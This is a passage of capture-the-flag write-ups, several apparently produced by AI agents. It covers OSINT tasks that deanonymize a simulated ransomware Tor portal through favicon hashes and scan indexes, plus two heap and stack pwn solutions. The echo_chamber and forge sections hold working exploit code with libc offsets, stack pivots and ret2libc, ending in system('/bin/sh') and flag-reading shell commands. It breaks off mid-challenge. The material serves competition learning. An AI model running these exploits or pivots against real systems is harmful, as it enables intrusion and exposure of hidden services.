The certificate was also saved for the later tasks in the series: the SHA-256 fingerprint `14BFCD53D509FEDF0CA4FE7E9A3D6FE2A0451F4EDAF77639EBBC0FED93EB2380` and SHA-1 `C950D928974937D5C4E9B0F7BFB3DD4716168F58` are the pivots Task 2 and Task 3 build on.

**Why it works**

A hidden service still has to complete a TLS handshake with anyone who connects, which means it must present a certificate. Reading that certificate requires nothing but reaching the service over Tor — no deanonymization yet, no second source. The serial is a direct field of the leaf, so once the leaf is in hand the answer is a one-line openssl read. The deeper point the lab is setting up: this self-signed leaf is a unique fingerprint the crew will unwittingly present on the clear web too, which is what Tasks 3 and 4 exploit.

**Validation / reproduction**

The certificate's subject and issuer both equal the onion name, confirming it is the service's own leaf rather than a proxy or intermediate. The serial is read verbatim from that leaf with `openssl x509 -noout -serial`. Accepted on the first submission (manual CLI submit by secretNinja). To reproduce: start a tor daemon on any free SOCKS port, run the curl `%{certs}` capture against the onion address, `awk` out the first PEM block, and read its serial. Gotcha: use `--socks5-hostname` (not `--socks5`) so Tor resolves the `.onion` name — a plain `--socks5` attempts a local DNS lookup and fails.

### Onion Deanon 2: Find the Back Office

> OSINT · Medium · Created by [Covert Security](https://covsec.ee)  
> Points: 0 · Flag submitted by: secretNinja

**The flag**

`CSCTF{da4f9b9a-31c7-4b8f-91cb-1a5009d5f65b}`

**Challenge**

Task 4 of the "Onion Deanon 2" lab. Find the operator's admin panel on the Task 3 origin and retrieve the decryption key (a UUID) for the Coop & Crumb case. The answer boundary: use the unique origin from Task 3, the UUID must be shown verbatim by the admin panel, and no path enumeration, wordlists, or generated candidate tokens are allowed.

**Tools used**

FOFA and Netlas (anonymous web search); curl.

**Approach / walkthrough**

1. **Re-establish the origin.** A FOFA anonymous search on the Task 1 favicon hash pivots to the single clear-web host:

   ```
   icon_hash="-209798607"  ->  185.146.85.96:80
   ```

   title `DarkPigeon | Negotiation Portal`, nginx, Claus Web SRL (AS203053, Bucharest RO), rDNS `cw185-adf-he96.romania-webhosting.com`. One GET of `http://185.146.85.96/` returns a body byte-identical (by SHA-256) to the onion index from Task 1, and `/favicon.ico` is identical too (SHA-256 `195873a0...`). (Note: the favicon's PNG `tEXt` Comment holds a watermark UUID `8a8b3b25-ac32-4f22-890d-cb14db334bea` — a decoy, *not* the answer.)

2. **Confirm the portal exposes nothing extra.** `robots.txt` and `sitemap.xml` both 404; no links, JS, or informative headers. Shodan's InternetDB shows only `:80`; FOFA shows `:22` and `:80`. The portal front offers no route to the panel, and the brief forbids enumeration — so get the extra port from a scan index.

3. **Find the admin port in a second scan index.** Netlas's anonymous response index for the origin IP lists the extra service:

   ```
   https://app.netlas.io/api/responses/?q=ip:185.146.85.96
   ```

   It returns `http://185.146.85.96:8080/` with HTML title `DarkPigeon Admin` (archived scan 2026-10-23). The port comes from the archive, not from scanning.

4. **Open the panel (GET #1) and read its form.** One GET of `:8080/`:

   ```sh
   curl -s http://185.146.85.96:8080/
   ```

   ```html
   <title>DarkPigeon Admin</title>
   <h1>:: DARKPIGEON ADMIN // NEGOTIATION BACKEND ::</h1>
   <tr><td>CC-0417</td><td>Coop &amp; Crumb Birdseed Wholesalers</td><td>1.4 XMR</td><td class="pending">negotiating</td></tr>
   <form action="/ticket" method="get">
     Open ticket for case: <input name="case" pattern="CC-[0-9]{4}" ...><button>Open</button>
   ```

   The case table's Coop & Crumb row is case `CC-0417` (matching the victim named in the forum post), and the panel's own form defines the path `GET /ticket?case=CC-NNNN`. The path and case id both come from the page itself — no guessing.

5. **Open the ticket (GET #2) and take the key.** One GET of `/ticket?case=CC-0417`:

   ```sh
   curl -s "http://185.146.85.96:8080/ticket?case=CC-0417"
   ```

   The ticket page prints the key verbatim:

   ```html
   <div class="msg"><span class="who">roost_admin:</span> Good. Key is below. Release it only after the payment is confirmed on chain. Not before.</div>
   <div class="key">Decryption key (release after payment confirmed):<br><br>
     <code>da4f9b9a-31c7-4b8f-91cb-1a5009d5f65b</code>
   ```

   Wrap the UUID in the flag format.

**Why it works**

The operator ran the public portal and the admin backend on the same origin box. Tor hides the portal's location but not the box's other clear-web services; a scan index reveals the admin port, and the panel's own form supplies the path and case id, so the key is reached passively without enumeration. As in the sister lab, the back office is a second HTTP port of the same server — discoverable entirely from a public scan archive.

**Validation / reproduction**

Every step uses a value already in hand — the port from the Netlas index, the path from the panel's form, the case id from the panel row and the forum post — so no guessing or wordlists are used, matching the scope. The decryption key is shown verbatim by the admin panel's ticket view (evidence saved as `admin.html` and `ticket.html`). Accepted on the first submission (manual CLI submit by secretNinja). Gotcha: the favicon's embedded `tEXt` watermark UUID is a deliberate decoy — the real answer is the ticket page's key, not the one baked into the icon.

### Onion Deanon 2: Find the Origin

> OSINT · Medium · Created by [Covert Security](https://covsec.ee)  
> Points: 0 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{185.146.85.96}`

**Challenge**

Task 3 of the DarkPigeon lab: find the one clear-web IPv4 that serves the portal. The answer boundary: submit the one clear-web IPv4 that serves the portal identified from the Task 1 favicon — not onion infrastructure, a relay, a historical host, or a guessed address. Scope stays passive, so the plan is to send no new traffic at all — ask an index that has already scanned the internet which server serves this exact favicon.

**Tools used**

Censys Platform search (no account needed).

**Approach / walkthrough**

1. **Choose the index and the key.** Shodan indexes favicons under the Task 1 MurmurHash3 value (`http.favicon.hash:-209798607`), but its favicon filter needs an account and query credits. Censys indexes favicons under several hashes, including plain MD5, and answers searches without a login — so the key is the Task 2 MD5, `ad866421d43a616ab0e4dd089fc94b06`. That the Shodan-style value is not Censys's key is worth confirming: the field query `web.endpoints.http.favicons.hash_shodan:-209798607` returns "Something went wrong", and the bare number `"-209798607"` in quotes returns nothing.

2. **Search the MD5.** Quote it so Censys matches it against every field that could hold it:

   ```
   https://platform.censys.io/search?q="ad866421d43a616ab0e4dd089fc94b06"
   ```

   Three results come back in about half a second, all on one network (ClausWEB / CLAUS WEB srl, AS203053, Bucharest RO):

   ```
   185.146.85.96 : 80          WEB PROPERTY   AS OF NOV 07, 2026
     HTML Title  DarkPigeon | Negotiation Portal      Endpoints (1) /     Software F5 Nginx
     MATCHED FIELDS  web.endpoints.http.favicons.hash_md5  ad866421d43a616ab0e4dd089fc94b06

   cw185-adf-he96.romania-webhosting.com : 80   WEB PROPERTY   AS OF NOV 02, 2026
     HTML Title  DarkPigeon | Negotiation Portal      (same favicon MD5)

   185.146.85.96               HOST
     cw185-adf-he96.romania-webhosting.com   AS203053 (ClausWEB)   Bucharest (RO)
     SERVICES (3)  22 / SSH   80 / HTTP   8080 / HTTP
   ```

   Three cards, one server: the IP's web property on port 80, the host record for the same IP, and the same machine again under its hosting-provider PTR (`cw185-adf-he96` carries the first and last octets of `185.146.85.96`). The exact field query `web.endpoints.http.favicons.hash_md5:"ad866421d43a616ab0e4dd089fc94b06"` returns the same two web properties. The clear-web page title, `DarkPigeon | Negotiation Portal`, is word-for-word the onion portal's title from Task 1.

3. **Check against the answer boundary.** It is not onion infrastructure or a relay (Censys found it by scanning the clear web); not historical (the IP's web property is dated NOV 07, 2026, the current scan; the PTR card is five days older but names the same IP); not guessed (matched on the favicon MD5 and corroborated by the page title); and all three cards resolve to one IPv4. That address, in the flag wrapper, is the answer. The host also exposes `8080 / HTTP` beside the portal — noted for Task 4.

**Why it works**

Tor hides where the portal runs, not what it serves. The operators put the same site on a clear-web nginx that answers internet-wide scans like any other server. Censys fetched its favicon during a routine scan and stored the MD5 of the bytes. The hidden service hands out that identical file, so the MD5 computed over Tor is exactly the key Censys has on file for `185.146.85.96`, and the page title ties the match down. Nothing is sent to the server to find it — the deanonymization is entirely a lookup of what the server had already told the public internet about itself.

**Validation / reproduction**

The match rests on two independent signals — the favicon hash and the exact page title — and every result points to one IP. .dev's agent submitted it once and it was accepted. Independently, secretNinja reached the same host while working Task 4, through a FOFA search on the Task 1 favicon hash (`icon_hash="-209798607"`); one GET of that host's index and favicon returned bytes identical by SHA-256 to the onion portal's copies. To reproduce: paste the Task 2 MD5 in quotes into the Censys platform search and take the single IP all three cards share. Gotcha: search by the MD5, not the Shodan MurmurHash3 value — Censys does not answer to the `hash_shodan` field here.

### Onion Deanon 2: Hash the Favicon Again

> OSINT · Easy · Created by [Covert Security](https://covsec.ee)  
> Points: 0 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{ad866421d43a616ab0e4dd089fc94b06}`

**Challenge**

Task 2 of the DarkPigeon lab, continuing from Task 1 (same portal, `http://schpqwdfzcmdcbim7w24jj5ph5h6fqvcbj5zhkhof3z3v75ydljkzsad.onion`). Task 1 hashed the portal's favicon the way Shodan does (MurmurHash3, `-209798607`); this task asks for the plain MD5 of the same file, hexadecimal.

**Tools used**

`file`, `md5`.

**Approach / walkthrough**

The only input is the icon the hidden service serves, which Task 1 had already fetched over Tor and saved — so this task reuses that file rather than re-fetching. The bytes are identical and MD5 depends on nothing else.

1. **Reuse the Task 1 favicon.** Task 1 pulled `/favicon.ico` once over the Tor SOCKS proxy with `curl --socks5-hostname` (`.onion` names resolve only inside Tor). No new request to the target is sent for this task. If the file is gone, re-fetch it with one GET:

   ```sh
   ONION="http://schpqwdfzcmdcbim7w24jj5ph5h6fqvcbj5zhkhof3z3v75ydljkzsad.onion"
   curl -s --max-time 120 --socks5-hostname 127.0.0.1:9055 -D fav.hdr -o favicon.ico "$ONION/favicon.ico"
   ```

2. **Confirm it is the complete icon before hashing.** The captured headers show `200 OK`, `Content-Type: image/x-icon`, `Content-Length: 6434`; `file favicon.ico` reports "MS Windows icon resource - 3 icons, 16×16 / 32×32 PNG image data", not an HTML error page; and the size on disk equals the `Content-Length`. If `file` had said "HTML document", you would be about to hash the wrong thing.

3. **Take the MD5 of the raw bytes.**

   ```sh
   md5 favicon.ico
   ```

   ```
   MD5 (favicon.ico) = ad866421d43a616ab0e4dd089fc94b06
   ```

   On Linux use `md5sum favicon.ico`; `openssl dgst -md5 favicon.ico` works everywhere and prints the same 32 hex characters. Submit the lowercase digest in the flag wrapper.

**Why it works**

The favicon is the one object the hidden service hands unchanged to every visitor, so a content hash of it identifies the portal wherever else the same file is served. Different scan engines index favicons under different hashes: Shodan uses MurmurHash3 over the base64 of the file (Task 1's answer), while Censys stores the plain MD5 of the raw bytes. This task is that second form — no base64 step and no sign handling, just `md5` over the 6434 bytes nginx served. Having both hashes means the portal can be looked up in either index, which is exactly what Task 3 needs.

**Validation / reproduction**

The reused file was confirmed to be the real icon (status, content type, `file` signature, and byte count matching `Content-Length`) before hashing. .dev's agent submitted the digest once and it was accepted. Independently, secretNinja fetched the same favicon during Task 1, and its recorded SHA-256 (`195873a0...`) matches the bytes later served by the clear-web origin found in Task 3 — the same file across the onion and the clear web. To reproduce: take the Task 1 `favicon.ico` and run `md5` / `md5sum` / `openssl dgst -md5`; all three agree on `ad866421d43a616ab0e4dd089fc94b06`.

### Onion Deanon 2: Read the Favicon

> OSINT · Easy · Created by [Covert Security](https://covsec.ee)  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{-209798607}`

**Challenge**

Task 1 of the "Onion Deanon 2" lab. DarkPigeon runs its victim negotiation portal as a Tor hidden service — onion routing only, no clear-web domain. Scope: simulated environment, reach it with Tor, stay passive, only the single host you identify is in scope. The forum post hands you the address:

```
[ DARKPIGEON ] NEW VICTIM: Coop & Crumb Birdseed Wholesalers
Victim portal (Tor Browser): http://schpqwdfzcmdcbim7w24jj5ph5h6fqvcbj5zhkhof3z3v75ydljkzsad.onion
```

The task wants the portal's favicon hashed "the way Shodan does", returned as a signed integer.

**Tools used**

tor (local SOCKS proxy), curl, file; python3 with mmh3 (run via uv).

**Approach / walkthrough**

1. **Start a private Tor daemon.** Use a non-default SOCKS port so it won't collide with another tor:

   ```sh
   /opt/homebrew/opt/tor/bin/tor --SocksPort 9055 --DataDirectory /tmp/tor9170
   ```

   Wait for `Bootstrapped 100% (done)`.

2. **Load the portal index (passive GET #1).** `--socks5-hostname` hands the name to Tor for resolution; `.onion` names only resolve inside Tor, so plain `--socks5` would fail on a local DNS lookup:

   ```sh
   ONION="http://schpqwdfzcmdcbim7w24jj5ph5h6fqvcbj5zhkhof3z3v75ydljkzsad.onion"
   curl -s --max-time 120 --socks5-hostname 127.0.0.1:9055 -D index.hdr -o index.html "$ONION/"
   head -8 index.html
   ```

   The page is the DarkPigeon negotiation portal (case CC-0417, victim Coop & Crumb, matching the forum post). Its head names the icon: `<link rel="icon" href="/favicon.ico" type="image/x-icon">`.

3. **Fetch the favicon (passive GET #2).** Same route, now for the icon:

   ```sh
   curl -s --max-time 120 --socks5-hostname 127.0.0.1:9055 -D fav.hdr -o favicon.ico "$ONION/favicon.ico"
   file favicon.ico
   ```

   The headers show `200 OK`, `Content-Type: image/x-icon`, `Content-Length: 6434`; `file` reports a three-image Windows icon (16×16 and 32×32 PNG frames) — a real `.ico`, not an error page wearing the name. Its SHA-256 is `195873a07c938f21ef8c016048230bc84861d08653e8c01ccf3620089c848dea`.

4. **Reproduce Shodan's favicon hash exactly.** Shodan's `http.favicon.hash` is MurmurHash3 computed over the *MIME base64* encoding of the raw icon bytes (base64 with a newline every 76 chars and a trailing newline, i.e. what Python's `codecs.encode(..., "base64")` emits — not the single-line `base64.b64encode`), read as a signed 32-bit integer:

   ```python
   import codecs, pathlib, mmh3
   data = pathlib.Path("favicon.ico").read_bytes()
   print(len(data), mmh3.hash(codecs.encode(data, "base64")))
   ```

   ```sh
   uv run --with mmh3 python3 favhash.py
   ```

   ```
   6434 -209798607
   ```

   The byte count equals `Content-Length`, so the whole file went into the hash. Wrap the signed integer as-is.

**Why it works**

Tor hides the portal's network location, but not what it serves: the favicon reaches every visitor as ordinary bytes. Shodan indexes favicons by a content hash — MurmurHash3 over the standard-MIME base64 of the icon — precisely because that value depends only on the bytes, not on the address they came from. So the number computed through the onion equals the number Shodan stores for any clear-web host serving the identical file, which makes `http.favicon.hash:-209798607` a search key for finding where else this portal lives (the pivot Tasks 2–4 use). The minus sign is simply the 32-bit MurmurHash3 result read as a signed integer — exactly the form the answer asks for.

**Validation / reproduction**

The hash was computed with the reference `mmh3` package and cross-checked against an independent MurmurHash3 implementation; both give `-209798607`. Base64 *without* newlines yields a different value (`-1362675922`), confirming the standard-MIME encoding is the one Shodan uses. Accepted on the first submission. To reproduce: fetch `/favicon.ico` over Tor, confirm it is the full 6434-byte three-image ICO, then MurmurHash3 its `codecs.encode(data, "base64")` form. Gotcha: the base64 line-wrapping is load-bearing — the one-line `b64encode` form hashes differently and is wrong.


## Pwn

### echo_chamber

> Pwn · Hard · Iulian Schifirnet  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{h3z9Vtl0a3dNPYWqZPsWwtXE}
```

**Challenge**

> An echo node that repeats every transmission back to you, word for word. Recon says the operators
> were careless about how much they copy before they speak. Reach the node, make it repeat something
> it was never meant to be holding, and take the process for yourself.

`echo_chamber.tar.gz` ships the ELF plus the matching loader/libc and the source `echo_chamber.c`.
The binary is PIE with full RELRO, a stack canary and NX, on **GNU libc 2.35-0ubuntu3.15** (string
confirmed in the shipped `libc.so.6`). The whole program is one loop:

```c
static void chamber(void) {
    char buf[0x50];
    puts("The chamber listens. Say 'bye' to leave.");
    for (;;) {
        printf("> ");
        read(0, buf, 0x70);                 // reads 0x70 into a 0x50 buffer
        if (strncmp(buf, "bye", 3) == 0)
            break;
        printf("echo: %s\n", buf);          // prints until a NUL, not until read length
    }
}
```

`buf` is `char[0x50]` at `rbp-0x60`, so the frame is: `buf` at `0x00`–`0x4f`, canary at `0x58`
(`rbp-0x8`), saved `rbp` at `0x60`, saved return address at `0x68`.

**Approach / walkthrough**

The read of `0x70` (112) bytes into a `0x50` buffer reaches offsets `0..0x6f` — exactly covering the
canary, saved `rbp`, and the return slot, and no further. A normal ROP chain does not fit in that one
frame. But the loop reruns `read` **in place** over the same frame and only `bye` breaks out, with
the canary checked only on `leave`/return. That gives two primitives in a single connection:

- **Leak:** `printf("echo: %s\n", buf)` prints from `buf` up to the first NUL. Partially overwriting
  a field's low byte(s) with non-NUL data makes `%s` run past it and echo the adjacent secret bytes.
- **Overwrite:** the same `read` restores the canary and rewrites saved `rbp` and the return address
  before leaving with `bye`.

The key constraint: **the binary has no `pop rdi; ret`** (no `5f c3` anywhere in the file), so a
classic `puts(GOT)` libc leak is unavailable. The usable gadgets are only `leave; ret` (at
`pie+0x1365`, the sole `c9 c3` in the file), `pop rbp; ret`, and `ret`. The trick is to reuse the
program's *own* echo as an arbitrary-read gadget by controlling `rbp`: the echo computes its argument
as `lea rax,[rbp-0x60]; mov rsi,rax` before `printf("echo: %s")`, so pointing `rbp` at a chosen
location makes the chamber leak the qword living there.

All steps happen over one connection (`claude/x/final.py`, run as `python3 final.py remote`). The
script keys off the service's `> ` prompt and the `echo: ` prefix to slice each leak out of the
reply:

1. **Leak canary.** Send `0x59` bytes (`p.send(b"A"*0x59)`) — one byte past `buf+0x58` overwrites the
   canary's NUL LSB, so the echo prints `canary[1..7]`; prepend `\x00`
   (`u64((b"\x00"+d[0x59:0x60]).ljust(8,b"\x00"))`) to recover the full value.
2. **Leak stack.** Send `0x60` bytes → echo returns saved `rbp` (a stack address), sliced as
   `d[0x60:]`.
3. **Leak PIE.** Send `0x68` bytes → echo returns the saved return address; `pie_base = leaked -
   0x137e`.
4. **Leak libc via a controlled-`rbp` echo.** Break the loop with a payload that keeps the real
   canary and redirects `rbp` and the return into the echo block:

   ```python
   R  = savedrbp + 8 + 0x60
   pl = b"bye\x00" + b"P"*(0x58-4) + p64(canary) + p64(R) + p64(pie+0x1332)
   ```

   With `rbp := savedrbp + 8 + 0x60` and the return `:= pie + 0x1332` (the
   `lea rax,[rbp-0x60]; mov rsi,rax; printf("echo: %s")` block inside `chamber`), the echo now prints
   the qword at `savedrbp+8` = `main`'s return address = `__libc_start_call_main+0x80`, giving
   `libc_base = leaked - 0x29d90`. The code then re-enters the read loop with `rbp` preserved at `R`.
5. **Pivot + ret2libc.** In the second stage (`rbp = R`), stage the chain at `buf2 = R-0x60`. Build
   the ret2libc chain and the pivot payload:

   ```python
   buf2  = R - 0x60
   a     = 1 if (buf2 % 16) == 0 else 0
   chain = p64(libc+0x2a3e5) + p64(libc+0x1d8678) + p64(libc+0x29cd6)*a + p64(libc+0x50d70)
   pl2   = (b"bye\x00" + b"Q"*4 + chain).ljust(0x58, b"R") + p64(canary) + p64(buf2) + p64(pie+0x1365)
   assert len(pl2) == 0x70
   ```

   The double `leave; ret` pivot (saved `rbp := buf2`, return `:= pie + 0x1365`) lands `rsp` in `buf2`
   and executes the chain at `buf2+8`: `pop rdi (libc+0x2a3e5)` → `"/bin/sh" (libc+0x1d8678)` →
   optional `ret (libc+0x29cd6)` → `system (libc+0x50d70)`.
6. The shell runs as `uid=10001(ctf)`, and the follow-up command prints the flag.

**The alignment subtlety (local vs remote).** glibc 2.35 `system` hits a `movaps` that faults unless
`rsp % 16 == 8` at the `system` entry, which here depends on `buf2 % 16`. The correct rule is
`a = 1 if buf2%16==0 else 0` — insert one extra `ret` only when `buf2` is 16-aligned. **qemu-user (the
amd64 `csctf-pwn:1` image on the Apple-silicon host) ignores `movaps` alignment**, so a wrong `a`
still "worked" locally and masked the bug, while the real x86-64 remote segfaults on the wrong parity.
An early inverted formula (`a = 0 if buf2%16==0 else 1`) made all three initial remote runs
(`rem1.txt`–`rem3.txt`, all `buf2%16==8`, `a=1`) return no shell. With the corrected formula, the
run in `remfix.txt` (`buf2%16==8`, now `a=0`) dropped a shell, and the follow-up
`echo ===S===; cat flag.txt flag /flag.txt /flag ./flag* 2>/dev/null; id` printed the flag. It
appears three times because several of those paths/globs resolve to the same file.

The captured live run:

```
[*] canary=0x28085dc11de56c00 pie=0x5b78c1532000 libc=0x76994a930000 buf2=0x7fff833c3a88 align_rets=0
===S===
CSCTF{h3z9Vtl0a3dNPYWqZPsWwtXE}
uid=10001(ctf) gid=10001 groups=10001
```

Offsets reference (PIE + libc 2.35-0ubuntu3.15):

| symbol / gadget | offset |
| --- | --- |
| `chamber` echo `lea rax,[rbp-0x60]; …; printf` | `pie + 0x1332` |
| `main` saved-RIP delta (`pie_base = leaked - 0x137e`) | `- 0x137e` |
| `leave; ret` | `pie + 0x1365` |
| `__libc_start_call_main+0x80` stack-leak delta | `- 0x29d90` |
| `pop rdi; ret` (libc) | `libc + 0x2a3e5` |
| bare `ret` (libc) | `libc + 0x29cd6` |
| `"/bin/sh"` (libc) | `libc + 0x1d8678` |
| `system` (libc) | `libc + 0x50d70` |

**Why it works**

An off-by-design copy length paired with `%s` on an unterminated buffer leaks every secret on the
stack, so the canary and ASLR stop mattering. The overflow is too short for a real ROP chain, but
controlling saved `rbp` is enough: re-entering the function's own code with a chosen frame pointer
turns its echo into an arbitrary stack read (defeating the missing `pop rdi`), and turns its `leave`
into a stack pivot onto a larger buffer we fully control for the final ret2libc.

**Validation / reproduction**

The chain was built and run in the amd64 `csctf-pwn` Docker image against the shipped libc; the logs
show the `linux/amd64` platform warning on the arm64 host. PIE offsets (`0x1332`, `0x1365`, `0x137e`)
were re-checked against `objdump` of the shipped `echo_chamber` (no `5f c3`; `c9 c3` only at
`0x1365`), and the libc offsets against the shipped `libc.so.6`
(`system=0x50d70`, `"/bin/sh"=0x1d8678`, `5f c3` at `0x2a3e5`, `c3` at `0x29cd6`; `0x29d90` is the
instruction after the `call rax` into `main` in `__libc_start_call_main`). The flag is a per-instance
random value (`flag_mode: random`, `CSCTF{` + 24 chars + `}`); the value above is the one captured
from our assigned instance and accepted by CTFd.

Reproduce: in `workspace/9136-echo-chamber/claude/x` (has `echo_chamber`, `echo_patched`, `libc.so.6`,
`ld`, `final.py`), run `python3 final.py` for the local path (uses `echo_patched`, re-linked to the
shipped ld/libc) or `python3 final.py remote` against a fresh instance after editing `HOST,PORT` to
its connection info. Gotcha: the alignment parity must match the *real* x86-64 target, not the
emulator — qemu-user hides the `movaps` fault, so validate the parity rule rather than trusting a
local shell.

### forge

> Pwn · Medium · Iulian Schifirnet  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{tRBfcfVfgu8ZUKKuh1oyXjEq}
```

**Challenge**

> A mobile field forge the Ash Army hauls behind the line, stamping out replacement parts on demand:
> any size, no questions asked. The duty smith keeps a rack of work orders you can open, extend, read
> back and scrap. Push an order past what the metal can hold, turn the forge's own bookkeeping against
> it, and bend the next pour to a command of your choosing.

A per-team TCP service with source provided: `forge.c`, the `forge` binary, and the shipped
`ld-linux-x86-64.so.2` + `libc.so.6`. The binary is ELF64 PIE, not stripped, built
`-fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now` — **PIE, full RELRO, NX, stack canary** all
on (the ELF has `DT_FLAGS=BIND_NOW`, `PT_GNU_RELRO`, a non-exec `PT_GNU_STACK`, and imports
`__stack_chk_fail`). The libc is **GNU libc 2.27 (Ubuntu GLIBC 2.27-3ubuntu1.6)**, which still has
`__free_hook` and no top-chunk size check. The source header comment even names the technique:
`House of Force (glibc 2.27, Ubuntu 18.04)`.

The menu is a 16-slot note manager (`MAX_NOTES = 16`), each note a `{ char *data; size_t size; }`:
**forge** (`malloc(size)` for an arbitrary size, then read `size` bytes of content), **temper**
(append to an existing note), **inspect** (`puts(notes[i].data)`), **melt** (`free` and clear the
slot). Four verbs over a rack of notes — a textbook heap menu, which is exactly where the intended
primitive lives.

**Approach / walkthrough**

The content reader never NUL-terminates (`read_until_nl` reads up to `n` bytes, stops at `'\n'`, and
does not store a terminator), and `temper` is the bug:

```c
char *p = notes[i].data;
read_until_nl(p + strlen(p), notes[i].size);   // BUG: should be size - strlen(p)
```

Two faults compound. It writes at `p + strlen(p)` with a length of the *full* `notes[i].size` rather
than the remaining space — a heap overflow past the chunk. And because content is never
NUL-terminated, `strlen(p)` walks *into the adjacent chunk's header/data*, so the write offset is
itself controllable by what already sits after the chunk. That lets us land a write precisely on a
neighbor's **size field**.

glibc 2.27 has tcache but no size sanity on the top chunk, so the intended path is House of Force:
corrupt the top-chunk size to a huge value, then request a crafted `malloc` size to move the top chunk
to an arbitrary address and allocate there. With all protections on, we need a libc leak, a heap leak,
the top-size corruption, then a write into `__free_hook`. The full script is
`workspace/9137-forge/exploit.py` (pwntools); run it in `csctf-pwn:1`, loading the shipped 2.27
loader/libc (`./ld-linux-x86-64.so.2 --library-path . ./forge`). The four menu helpers in the script
mirror the service protocol exactly — `forge(size, data)` sends menu choice `1`, the `size>` prompt,
and the `content>` payload and parses back the `forged #<n>` slot index; `temper(i, data)` answers
`index>` and `more content>`; `inspect(i)` reads the `puts` output after `: `; `melt(i)` frees slot
`i`.

1. **libc leak (unsorted bin).** `forge(0x500, b'a')` (note A, slot 0) falls outside tcache; freeing
   it puts it in the unsorted bin, whose `fd`/`bk` point into `main_arena`. A note B of size `0x18`
   holding `"/bin/sh"` is forged right after A (before A is freed, slot 1) so A does not merge into
   top when freed — and B also holds the command string handed to `free`/`system` later. Re-forge the
   same 0x500 size with empty content (`forge(0x500, b'')`, reusing slot 0 from the 0x500 tcache/bin,
   leaving the arena pointer in `fd` intact) and `inspect` it:

   ```python
   libc = u64(inspect(a).ljust(8, b'\0')) - UNSORTED   # UNSORTED = 0x3ebca0 (main_arena+96)
   assert libc & 0xfff == 0                            # sanity: page-aligned base
   ```

   The read-back qword is `main_arena+96`, so `libc_base = leak - 0x3ebca0`.

2. **heap leak (tcache next).** Forge two 0x18 notes C and D (slots 2, 3), `free` both (`melt(c); melt(d)`
   → 0x20 tcache bin holds D → C), then re-forge one 0x18 note. It returns D, whose first 8 bytes are
   the tcache `next` pointer to C's user data. `inspect` leaks it:

   ```python
   c_user = u64(inspect(d).ljust(8, b'\0'))
   top    = c_user + 0x30     # D chunk = C chunk + 0x20, top = D chunk + 0x20
   ```

3. **corrupt the top size (the strlen trick).** D is the last chunk before top. Using `temper` on D:

   ```python
   temper(d, b'A' * (0x18 - 6))   # fill D's 0x18 bytes (6 bytes of leaked ptr already non-NUL)
   temper(d, b'\xff' * 5)         # strlen now walks to top's size; overwrite its upper bytes
   ```

   The second `temper` sets the top size to `0xffffffffff020841`. Derived from the layout
   (`tcache_perthread_struct` `0x250`, A `0x510`, B/C/D `0x20` each), top sits at heap+`0x7c0` with
   size `0x21000 - 0x7c0 | PREV_INUSE = 0x20841`; its three low bytes (`41 08 02`) are non-zero, so
   `strlen` stops at byte 3 and the five `0xff` bytes cover bytes 3..7. The remote leak
   `C user = …790` (heap+`0x790`) matches this layout.

4. **House of Force into `__free_hook`.** With a giant top size, request exactly the gap to move top
   just below `__free_hook`, then allocate the hook:

   ```python
   target_top = libc + 0x3ed8e8 - 0x18       # __free_hook - 0x18
   req        = target_top - top - 8         # request2size(req) == target_top - top (16-aligned)
   forge(req, b'')                            # top chunk now at __free_hook-0x18
   forge(0x28, b'X'*8 + p64(libc + 0x4f420))  # returns __free_hook-8; writes system into __free_hook
   ```

   The `0x28` request (not `0x18`) matters: the 0x20 tcache bin still holds C, so a 0x18 request would
   be served from tcache instead of the relocated top. `0x28` gives `nb = 0x30`, pulled from top and
   landing the 8-byte `X` pad followed by `system` exactly on `__free_hook`.

5. **Trigger.** `melt(B)` calls `free(notes[B].data)` where B's data is `"/bin/sh"`, and now
   `__free_hook == system`, so this is `system("/bin/sh")`. The script then sends
   `echo PWNED; cat flag* /flag* 2>/dev/null; ls /` down the shell and reads the flag back.

Offsets (from the shipped libc 2.27): `main_arena+96` = `0x3ebca0`, `__free_hook` = `0x3ed8e8`,
`system` = `0x4f420` (cross-checked: `__malloc_hook=0x3ebc30` → `main_arena=0x3ebc40` →
`main_arena+96=0x3ebca0`).

**Why it works**

The real subtlety is not House of Force itself but the non-terminating reader: `strlen` over
un-NUL-terminated heap data turns `temper` into a precise write primitive onto a neighbor's size
field. A wrong append length plus missing terminators overwrite the top chunk's size; glibc 2.27 does
not validate top's size, so a forged huge top lets `malloc` return memory at any chosen offset. With
`__free_hook` still present in this version, one write there gives code execution on the next `free`,
and B's `"/bin/sh"` makes that `free` into `system("/bin/sh")`. Matching the shipped loader and libc
exactly is what makes every offset land deterministically.

**Validation / reproduction**

Triage (`./csctf pull`) routed the challenge to `docs/playbooks/pwn.md` and the pwn engines
(`solvers/toolkits/pwn*.py`, `solvers/binary/binfmt.py`); because full source was shipped, the solve
came from reading `forge.c` by hand (the header comment even says `House of Force (glibc 2.27, Ubuntu
18.04)`), with no engine output used for the exploit itself. The binary was run only inside
`csctf-pwn:1`, using the shipped loader and libc, never on the host. The exploit got a shell plus a
local test flag, then ran unchanged, once, against our assigned instance — which matched the shipped
glibc 2.27, so no offset adaptation was needed:

```
libc   0x7839c1dd4000
C user 0x5572b2717790
-> shell -> cat flag* /flag*   (notes.md records the post-shell command as `cat /flag`)
CSCTF{tRBfcfVfgu8ZUKKuh1oyXjEq}
```

One run, first attempt correct (`tried.json`: one submission, `correct`). The flag is a per-instance
random value; the one above is from our assigned instance.

Reproduce: `python3 exploit.py` (local, via the shipped loader) or `python3 exploit.py <instance>`
after re-reading the instance's connection info. Gotchas: the exploit depends on matching the shipped
2.27 ld/libc exactly (the image's own glibc differs, so it loads the challenge directory's copies);
the `0x28` final request must avoid the stale 0x20 tcache entry; and the five `0xff` `temper` bytes
rely on the top size's three non-zero low bytes stopping `strlen` at byte 3. Note: no transcript of
the exploit run was saved in the workspace, so the leaked addresses above are from `notes.md`, not a
re-run for this write-up.

### Phantom Device

> Pwn · Not shown · Ahmed Abdelmoemen  
> Points: 875 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{935QoKmYNLOtHVt0iZ1XtDgM}
```

**Challenge**

> A communication module recovered from an intact Vostari drone presents itself as an Apple iOS
